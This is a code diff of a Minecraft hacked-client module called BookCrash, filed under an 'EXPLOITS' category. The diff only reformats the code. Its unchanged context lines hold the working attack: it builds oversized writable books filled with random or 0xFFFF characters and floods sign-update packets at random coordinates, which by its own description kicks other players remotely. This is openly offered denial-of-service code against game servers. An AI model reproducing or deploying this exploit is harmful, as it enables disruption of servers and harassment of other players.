@@ -50,18 +50,15 @@ public class BookCrash extends Module {
 
 	public BookCrash() {
 		super("BookCrash", KEY_UNBOUND, Category.EXPLOITS, "Abuses book and quill/sign packets to remotely kick people.",
-				new SettingMode("Mode", "Jessica", "Raion", "Sign"),
-				new SettingSlider("Uses", 1, 20, 5, 0),
-				new SettingSlider("Delay", 0, 5, 0, 0),
-				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old"),
-				new SettingSlider("Pages", 1,100,50,0),
-				new SettingToggle("Auto-Off", true));
+				new SettingMode("Mode", "Jessica", "Raion", "Sign"), new SettingSlider("Uses", 1, 20, 5, 0), new SettingSlider("Delay", 0, 5, 0, 0),
+				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old"), new SettingSlider("Pages", 1, 100, 50, 0), new SettingToggle("Auto-Off", true));
 	}
 
 	@Subscribe
 	public void onTick(EventTick event) {
 		delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
-		if (delay > 0) return;
+		if (delay > 0)
+			return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
 		ListTag list = new ListTag();
@@ -75,12 +72,12 @@ public class BookCrash extends Module {
 
 		if (getSetting(3).asMode().mode == 2) {
 			IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
-			size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
+			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
 		} else if (getSetting(3).asMode().mode == 1) {
 			size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
 		} else if (getSetting(3).asMode().mode == 0) {
 			IntStream chars = new Random().ints(0x20, 0x7E);
-			size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
+			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
 		} else if (getSetting(3).asMode().mode == 3) {
 			size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
 		}
@@ -89,8 +86,8 @@ public class BookCrash extends Module {
 			Text text = Text.Serializer.fromJson("{\"text\":\"pp\"}");
 			Random rand = new Random();
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
-				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
-						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
+				mc.player.networkHandler.sendPacket(
+						new UpdateSignC2SPacket(new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
 			}
 		} else {
 			for (int i = 0; i < pages; i++) {
@@ -122,6 +119,7 @@ public class BookCrash extends Module {
 
 	@Subscribe
 	private void EventDisconnect(EventReadPacket event) {
-		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state) setToggled(false);
+		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state)
+			setToggled(false);
 	}
 }
